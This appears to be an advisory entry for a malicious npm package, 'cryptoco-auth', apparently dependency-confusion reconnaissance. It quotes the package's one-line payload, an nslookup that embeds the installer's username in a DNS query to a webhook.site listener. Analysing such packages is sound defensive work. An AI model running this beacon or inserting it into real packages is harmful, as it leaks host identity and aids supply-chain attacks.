  "summary": "DNS exfiltration of installer username via webhook.site beacon on require()",
  "details": "On import, index.js executes `nslookup $(whoami).cryptoco.50a891aa.webhook.site`, embedding the installer's Unix username as a DNS label in a query to an attacker-controlled webhook.site listener. The package ships no advertised functionality — the 253-byte index.js contains only this beacon and exports nothing. The shape (empty shell + name suggesting an auth SDK + host-identifier exfiltration to a webhook.site logger) is consistent with dependency-confusion / typosquat reconnaissance: the author is probing whether internal builds resolve `cryptoco-auth` from the public registry and reporting back the username of any host that does.",
